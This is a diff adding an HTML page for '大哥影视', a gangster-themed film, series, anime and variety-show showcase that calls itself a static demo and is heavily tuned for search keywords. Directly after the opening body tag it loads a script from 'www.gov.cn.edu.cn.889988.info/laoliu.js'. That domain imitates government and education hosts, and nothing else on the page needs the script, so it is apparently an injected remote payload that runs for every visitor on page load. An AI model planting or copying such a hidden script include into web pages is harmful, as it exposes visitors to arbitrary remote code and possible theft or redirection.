@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>大哥影视 - 好片如兄弟，大哥替你挑 | dageyingshi-h5.github.io</title>
+<meta name="description" content="大哥影视（dageyingshi-h5.github.io）好片如兄弟：电影、江湖剧集、硬核动漫、夜场综艺、港片修复一站挑片。大哥力荐、4K高清、港片修复、纯爷们必看。移动端自适应，纯静态演示站。" />
+<meta name="keywords" content="大哥影视,dageyingshi-h5,好片如兄弟,高清影视,港片修复,英雄本色,无间道,让子弹飞,狂飙,硬核动漫,纯爷们必看" />
+<link rel="canonical" href="https://dageyingshi-h5.github.io/" />
+<style>
+:root{
+  --bg:#0E0E10;--bg2:#15151A;--panel:#1B1B21;--gold:#E8B339;--red:#E23B3B;
+  --cyan:#39E0C8;--gray:#9AA0A6;--line:rgba(232,179,57,.34);--maxw:1180px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(120% 80% at 4% -10%,rgba(232,179,57,.22),transparent 55%),
+    radial-gradient(120% 90% at 98% 0%,rgba(226,59,59,.20),transparent 55%),
+    radial-gradient(90% 70% at 50% 120%,rgba(57,224,200,.12),transparent 60%),
+    linear-gradient(180deg,#0A0A0C 0%,#0E0E10 45%,#15151A 100%);
+  color:#F4F1E9;line-height:1.75;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+body::after{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.14;
+  background:repeating-linear-gradient(0deg,rgba(232,179,57,.06) 0 1px,transparent 1px 4px)}
+
+header.site{position:sticky;top:0;z-index:60;background:rgba(10,10,12,.88);backdrop-filter:blur(14px);border-bottom:2px solid rgba(232,179,57,.45)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px}
+.seal{width:38px;height:38px;border-radius:9px;background:linear-gradient(135deg,var(--gold),var(--red));
+  display:flex;align-items:center;justify-content:center;color:#1a1206;font-size:18px;box-shadow:0 0 16px rgba(232,179,57,.5)}
+.logo small{display:block;font-size:9px;color:var(--gray);font-weight:600}
+.menu{margin-left:auto;display:flex;gap:2px}
+.menu a{padding:8px 13px;border-radius:8px;font-size:13px;font-weight:700;color:var(--gray)}
+.menu a:hover{background:rgba(232,179,57,.16);color:var(--gold)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:132px;padding:8px 12px;border-radius:8px;border:1px solid var(--line);background:#101015;outline:none;font-size:13px;color:#F4F1E9}
+.search-min button{border:0;padding:8px 14px;border-radius:8px;cursor:pointer;font-weight:800;background:var(--red);color:#fff;font-size:13px}
+.burger{display:none;margin-left:auto;border:1px solid var(--line);background:#101015;border-radius:8px;padding:6px 10px;font-size:16px;color:var(--gold)}
+
+.hero{position:relative;z-index:1;margin:22px 0 6px;border-radius:26px;overflow:hidden;border:2px solid rgba(232,179,57,.5);
+  padding:48px 32px;background:linear-gradient(120deg,rgba(27,27,33,.98),rgba(21,21,26,.94))}
+.hero::before{content:"🥃 BIG BRO STUDIO · 好片如兄弟";position:absolute;top:14px;left:20px;font-size:11px;color:var(--gold);letter-spacing:1px;font-family:ui-monospace,monospace}
+.hero::after{content:"";position:absolute;right:-30px;bottom:-30px;width:220px;height:220px;
+  background:conic-gradient(from 0deg,var(--gold),var(--red),var(--cyan),var(--gold));filter:blur(70px);opacity:.28}
+.badge{display:inline-block;font-size:12px;font-weight:800;color:#1a1206;background:var(--gold);padding:5px 14px;border-radius:999px;margin-bottom:12px}
+.hero h1{font-size:33px;margin:0 0 6px}
+.hero h1 em{font-style:normal;color:var(--gold);text-shadow:0 0 18px rgba(232,179,57,.5)}
+.hero p{color:#CFCABE;font-size:14px;margin:0 auto 18px;max-width:660px}
+.bigbar{display:flex;gap:8px;max-width:680px;margin:0 auto;background:#101015;border:1px solid var(--gold);border-radius:999px;padding:6px 6px 6px 18px;box-shadow:0 0 22px rgba(232,179,57,.22)}
+.bigbar input{flex:1;border:0;outline:none;font-size:15px;background:transparent;color:#F4F1E9}
+.bigbar button{border:0;padding:10px 24px;border-radius:999px;background:linear-gradient(135deg,var(--gold),var(--red));color:#1a1206;font-weight:900;cursor:pointer}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips a{font-size:12px;font-weight:700;padding:6px 14px;border-radius:999px;background:rgba(226,59,59,.12);border:1px solid rgba(226,59,59,.45);color:var(--red)}
+.chips a:hover{background:var(--gold);color:#1a1206;border-color:var(--gold)}
+
+.quotes{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;position:relative;z-index:1;margin-top:18px}
+.q{background:var(--panel);border:1px dashed rgba(232,179,57,.5);border-radius:14px;padding:14px 16px;font-style:italic;color:#E9E2D2}
+.q b{display:block;font-style:normal;color:var(--gold);font-size:12px;margin-top:6px}
+
+.section{padding:32px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px;flex-wrap:wrap;border-left:5px solid var(--red);padding-left:12px}
+.sec-head h2{font-size:21px;margin:0}
+.sec-head h2::before{content:"🥃 ";}
+.sec-head h2 .b{color:var(--gold)}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--gold);font-size:12px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{background:var(--panel);border:1px solid rgba(232,179,57,.22);border-radius:16px;overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:var(--gold);box-shadow:0 16px 40px rgba(232,179,57,.25)}
+.cover{aspect-ratio:3/4;border-radius:16px 16px 0 0;position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:10px}
+.card:nth-child(1) .cover{background:linear-gradient(160deg,#2a1d05,#E8B339)}
+.card:nth-child(2) .cover{background:linear-gradient(160deg,#2a0606,#E23B3B)}
+.card:nth-child(3) .cover{background:linear-gradient(160deg,#06231f,#39E0C8)}
+.card:nth-child(4) .cover{background:linear-gradient(160deg,#1a1030,#8A7BFF)}
+.card:nth-child(5) .cover{background:linear-gradient(160deg,#2a1505,#C77B3B)}
+.card:nth-child(6) .cover{background:linear-gradient(160deg,#101820,#5BC0EB)}
+.card:nth-child(7) .cover{background:linear-gradient(160deg,#220010,#FF6FA3)}
+.card:nth-child(8) .cover{background:linear-gradient(160deg,#102a10,#7FD66A)}
+.flag{font-size:10px;font-weight:900;padding:3px 9px;border-radius:6px;background:var(--gold);color:#1a1206}
+.flag.rec{background:var(--red);color:#fff}
+.flag.fix{background:#101015;color:var(--gold);border:1px solid var(--gold)}
+.flag.hot{background:var(--cyan);color:#06231d}
+.cover h4{margin:auto 0 0;color:#fff;font-size:14px;text-shadow:0 2px 10px rgba(0,0,0,.7);width:100%}
+.body{padding:12px}
+.tags{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:5px}
+.tags span{font-size:10px;padding:2px 8px;border-radius:999px;background:rgba(232,179,57,.1);color:var(--gray);font-weight:600}
+.body p{margin:0;font-size:11px;color:var(--gray)}
+
+.layout{display:grid;grid-template-columns:1fr 320px;gap:20px}
+.zones{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.zone{background:var(--panel);border:1px solid rgba(226,59,59,.3);border-radius:14px;padding:16px}
+.zone .ic{font-size:22px}
+.zone h3{font-size:14px;margin:6px 0 2px}
+.zone p{font-size:11px;color:var(--gray);margin:0}
+
+.side{background:var(--panel);border:2px solid rgba(232,179,57,.6);border-radius:16px;padding:16px}
+.side h3{font-size:15px;margin:0 0 12px;color:var(--gold)}
+.rk{display:flex;gap:10px;align-items:center;padding:9px 0;border-bottom:1px dashed rgba(232,179,57,.25)}
+.rk:last-child{border-bottom:0}
+.rk b{width:26px;color:var(--gold);font-size:15px;font-weight:900;font-family:ui-monospace,monospace}
+.rk div{flex:1}
+.rk div h4{margin:0;font-size:13px}
+.rk div span{font-size:10px;color:var(--gray)}
+.rk em{font-style:normal;font-size:11px;font-weight:800;color:var(--red)}
+
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:20px}
+.ac{background:var(--panel);border:1px solid rgba(232,179,57,.22);border-radius:18px;padding:22px}
+.ac h3{margin:0 0 10px;font-size:17px}
+.ac h3::before{content:"🥃 ";}
+.ac p,.ac li{font-size:13px;color:var(--gray);line-height:1.8}
+.ac ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:10px;margin-top:14px}
+.st{flex:1;text-align:center;background:#101015;border:1px solid rgba(232,179,57,.4);border-radius:14px;padding:12px}
+.st b{display:block;font-size:18px;color:var(--gold)}
+.st span{font-size:11px;color:var(--gray)}
+
+footer.site{border-top:1px solid rgba(232,179,57,.3);background:#0A0A0C;padding:26px 0 40px;color:var(--gray);font-size:12px;text-align:center;position:relative;z-index:1}
+footer.site a{color:var(--gold)}
+code{background:#101015;border:1px solid rgba(232,179,57,.3);padding:2px 7px;border-radius:6px;font-size:11px}
+
+@media(max-width:980px){.layout{grid-template-columns:1fr}.zones{grid-template-columns:repeat(2,1fr)}.grid{grid-template-columns:repeat(3,1fr)}.about{grid-template-columns:1fr}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:#0A0A0C;border-bottom:1px solid rgba(232,179,57,.4);padding:10px 16px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:84px}.hero h1{font-size:23px}
+  .grid,.zones{grid-template-columns:1fr 1fr}.quotes{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="seal">🥃</div>
+      <div>大哥影视<small>dageyingshi-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">大哥首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#acg">动漫</a>
+      <a href="#fix">老片修复</a>
+      <a href="#about">关于大哥</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="英雄本色 / 狂飙 / 鬼灭 / 让子弹飞 / 庆余年3" />
+      <button onclick="alert('演示站：播放用 # 占位')">▶ 看片</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <span class="badge">🥃 好片如兄弟 · 大哥替你挑，不整虚的</span>
+    <h1>大哥影视，<br/><em>坐好，大哥给你放好片</em></h1>
+    <p>电影、江湖剧集、硬核动漫、夜场综艺、港片修复，全在一块砖墙上。不整花活：大哥力荐、4K 高清、港片修复、纯爷们必看。别刷三小时还不知道看啥——进堂口，挑一片，开灯关灯都是江湖。</p>
+    <div class="bigbar">
+      <input type="text" placeholder="> 搜：无间道 / 英雄本色 / 狂飙终章 / 鬼灭无限城 / 庆余年3 / 让子弹飞" />
+      <button onclick="alert('演示站：结果用 # 占位')">开片</button>
+    </div>
+    <div class="chips">
+      <a href="#movie">大哥电影</a>
+      <a href="#tv">江湖剧集</a>
+      <a href="#acg">硬核动漫</a>
+      <a href="#show">夜场综艺</a>
+      <a href="#fix">港片修复</a>
+      <a href="#rank">大哥榜</a>
+    </div>
+
+    <div class="quotes">
+      <div class="q">“我不做大哥很久了。”<b>— 英雄本色 1986</b></div>
+      <div class="q">“我想做个好人。”<b>— 无间道 2002</b></div>
+      <div class="q">“让子弹飞一会儿。”<b>— 让子弹飞 2010</b></div>
+    </div>
+  </section>
+
+  <section class="section" id="movie">
+    <div class="sec-head"><h2><span class="b">大哥</span>电影</h2><span>big.bro.movies</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag rec">大哥力荐</span><h4>英雄本色</h4></div><div class="body"><div class="tags"><span>港片</span><span>犯罪</span><span>8.7</span></div><p>小马哥风衣牙签，“我不做大哥很久了”是江湖启蒙。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag hot">热</span><h4>无间道</h4></div><div class="body"><div class="tags"><span>警匪</span><span>悬疑</span><span>9.2</span></div><p>天台戏每一句试探都算数，想做个好人的狠话。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">黑色</span><h4>让子弹飞</h4></div><div class="body"><div class="tags"><span>喜剧</span><span>权谋</span><span>9.0</span></div><p>鹅城三巨头摆桌斗法，台词能嚼三年。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">硬核</span><h4>狂飙·终章</h4></div><div class="body"><div class="tags"><span>扫黑</span><span>2026</span><span>9.7</span></div><p>高启强最终局，正义和人情一起结账。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag fix">4K修复</span><h4>纵横四海</h4></div><div class="body"><div class="tags"><span>港片</span><span>动作</span><span>8.8</span></div><p>美术馆偷画、轮椅华尔兹，浪漫得不像贼。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">科幻</span><h4>流浪地球3</h4></div><div class="body"><div class="tags"><span>国产</span><span>1080P</span><span>9.8</span></div><p>星海归途，大哥也认中国科幻天花板。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">神话</span><h4>封神第二部</h4></div><div class="body"><div class="tags"><span>东方奇幻</span><span>158min</span><span>9.7</span></div><p>西岐神魔大战，特效和义气都够硬。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag rec">大哥力荐</span><h4>喋血双雄</h4></div><div class="body"><div class="tags"><span>港片</span><span>枪战</span><span>8.9</span></div><p>教堂白鸽、子弹和兄弟情，吴宇森封神。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="layout">
+      <div>
+        <div class="sec-head" id="tv"><h2><span class="b">江湖</span>剧集</h2><span>gangster.series</span><a class="more" href="#">更多 #</a></div>
+        <div class="zones">
+          <div class="zone"><div class="ic">🎩</div><h3>狂飙</h3><p>2000—2026 跨年扫黑，高启强从卖鱼到堂口老大。</p></div>
+          <div class="zone"><div class="ic">🏮</div><h3>庆余年3</h3><p>范闲决战京都，权谋比枪火更烫手。</p></div>
+          <div class="zone"><div class="ic">🌃</div><h3>繁花</h3><p>90 年代上海商海，王家卫把江湖拍成霓虹。</p></div>
+          <div class="zone"><div class="ic">🕵️</div><h3>猎罪图鉴</h3><p>画像师看人，比警察先看见人心。</p></div>
+          <div class="zone"><div class="ic">🗡️</div><h3>一念关山</h3><p>六骑入长安，江湖和庙堂都不干净。</p></div>
+          <div class="zone"><div class="ic">🚬</div><h3>漫长的季节</h3><p>东北老厂、碎尸案、出租车司机，江湖在时代里生锈。</p></div>
+        </div>
+
+        <div class="sec-head" id="acg" style="margin-top:26px"><h2><span class="b">硬核</span>动漫</h2><span>hardcore.anime</span><a class="more" href="#">更多 #</a></div>
+        <div class="grid">
+          <div class="card"><div class="cover"><span class="flag hot">热血</span><h4>鬼灭之刃 无限城篇</h4></div><div class="body"><div class="tags"><span>战斗</span><span>1080P</span><span>9.9</span></div><p>鬼杀队决战无惨，纯爷们也得哭出来。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">国漫</span><h4>仙逆</h4></div><div class="body"><div class="tags"><span>修仙</span><span>9.2</span><span>更新中</span></div><p>王林逆天，江湖不在庙堂在修真界。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">玄幻</span><h4>凡人修仙传</h4></div><div class="body"><div class="tags"><span>仙侠</span><span>8.8</span><span>硬核</span></div><p>没金手指也能活，大哥最爱这种狠人。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">咒术</span><h4>咒术回战 死灭回游</h4></div><div class="body"><div class="tags"><span>奇幻</span><span>9.8</span><span>宿傩</span></div><p>虎杖和宿傩抢身体，比帮派火并还疯。</p></div></div>
+        </div>
+      </div>
+
+      <aside class="side" id="rank">
+        <h3>🥃 大哥榜</h3>
+        <div class="rk"><b>01</b><div><h4>英雄本色</h4><span>港片 / 大哥入门</span></div><em>8.7</em></div>
+        <div class="rk"><b>02</b><div><h4>无间道</h4><span>警匪 / 天台戏</span></div><em>9.2</em></div>
+        <div class="rk"><b>03</b><div><h4>让子弹飞</h4><span>黑色喜剧</span></div><em>9.0</em></div>
+        <div class="rk"><b>04</b><div><h4>狂飙·终章</h4><span>扫黑 / 2026</span></div><em>9.7</em></div>
+        <div class="rk"><b>05</b><div><h4>鬼灭之刃 无限城篇</h4><span>动漫 / 热血</span></div><em>9.9</em></div>
+        <div class="rk"><b>06</b><div><h4>漫长的季节</h4><span>悬疑 / 东北</span></div><em>9.4</em></div>
+        <div class="rk"><b>07</b><div><h4>庆余年3</h4><span>古装权谋</span></div><em>9.8</em></div>
+        <div class="rk"><b>08</b><div><h4>纵横四海 4K</h4><span>港片修复</span></div><em>修复</em></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="section" id="fix">
+    <div class="sec-head"><h2><span class="b">港片</span> / 老片修复</h2><span>hk.restoration</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag fix">4K修复</span><h4>英雄本色 1986</h4></div><div class="body"><div class="tags"><span>吴宇森</span><span>周润发</span><span>张国荣</span></div><p>风衣、牙签、码头枪战，修复后胶片颗粒还在。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag fix">2K修复</span><h4>无间道 2002</h4></div><div class="body"><div class="tags"><span>刘德华</span><span>梁朝伟</span><span>天台</span></div><p>“三年又三年”，修复版连烟味都清楚。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag fix">4K修复</span><h4>纵横四海 1991</h4></div><div class="body"><div class="tags"><span>浪漫贼</span><span>美术馆</span><span>轮椅舞</span></div><p>发哥、红姑、钟楚红，江湖也可以很优雅。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag fix">修复</span><h4>喋血双雄 1989</h4></div><div class="body"><div class="tags"><span>白鸽</span><span>教堂</span><span>枪火</span></div><p>杀手和警察互相递命，港片美学顶点之一。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="show">
+    <div class="sec-head"><h2><span class="b">夜场</span>综艺</h2><span>night.show</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag hot">夜场</span><h4>乘风2026</h4></div><div class="body"><div class="tags"><span>舞台</span><span>姐姐</span><span>EP12</span></div><p>凌晨一点看姐姐炸场，比酒局还上头。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">烧脑</span><h4>明星大侦探9</h4></div><div class="body"><div class="tags"><span>推理</span><span>反转</span><span>更新中</span></div><p>大哥也爱坐后排找破绽。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">穷游</span><h4>哈哈哈哈哈4</h4></div><div class="body"><div class="tags"><span>五哈</span><span>爆笑</span><span>下饭</span></div><p>没钱也要闯，兄弟互坑才是真综艺。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">街舞</span><h4>这就是街舞6</h4></div><div class="body"><div class="tags"><span>Battle</span><span>顶尖舞者</span><span>EP10</span></div><p>地板动作像片场火并，纯技术流。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 大哥影视</h2><span>about.bigbro</span></div>
+    <div class="about">
+      <div class="ac">
+        <h3>大哥影视是什么？</h3>
+        <p>大哥影视（dageyingshi-h5.github.io）不装算法上帝，也不装正版商城——就一间“挑片堂口”：好片如兄弟，大哥替你翻完港片、扫黑剧、国漫、夜场综艺、4K 修复老片。 和柠萌的片场感、秒播的极客感、6V 的终端感都不一样，大哥影视是**“坐好，别挑了，开片”**的义气站。墨夜黑打底，大哥金写字，义气红点名，霓虹青补夜场光。</p>
+        <div class="stats">
+          <div class="st"><b>🥃</b><span>挑片堂口</span></div>
+          <div class="st"><b>5类</b><span>电影/剧/动漫/综艺/修复</span></div>
+          <div class="st"><b>4K</b><span>港片修复</span></div>
+          <div class="st"><b>100%</b><span>移动端</span></div>
+        </div>
+      </div>
+      <div class="ac">
+        <h3>demo.note</h3>
+        <ul>
+          <li>纯静态单页，无后端、无真实视频源</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>与任何“大哥影视”App / 盗版站无隶属，仅江湖味致敬</li>
+          <li>必应收录友好：唯一 h1、canonical、description 完整</li>
+          <li>墨夜黑 + 大哥金 + 义气红 = 挑片堂口 / 好片如兄弟</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    🥃 大哥影视 --host dageyingshi-h5.github.io<br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 大哥影视 Demo · 好片如兄弟，大哥替你挑 🥃
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
